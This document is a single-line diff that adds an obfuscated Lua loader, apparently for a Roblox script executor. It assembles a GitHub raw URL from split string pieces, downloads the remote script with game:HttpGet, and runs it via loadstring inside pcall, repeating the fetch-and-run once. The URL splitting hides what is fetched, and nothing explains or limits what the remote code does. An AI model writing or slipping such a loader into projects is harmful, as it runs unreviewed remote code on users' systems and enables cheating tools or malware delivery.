@@ -1,0 +1,1 @@
+local a="htt";local b="ps://";local c="raw.githubusercontent.com";local d="/Midnight-Star-blip/Astro-s-Dreamworld/refs/heads/main/";local e="AstroMain.lua";local f=a..b..c..d..e;local g=game:HttpGet;local h=loadstring;local i=pcall;local j=function()local k=g(f);if k and #k>1000 then local l=h(k);if l then l()end end end;i(j);task.wait(0.3);i(j)
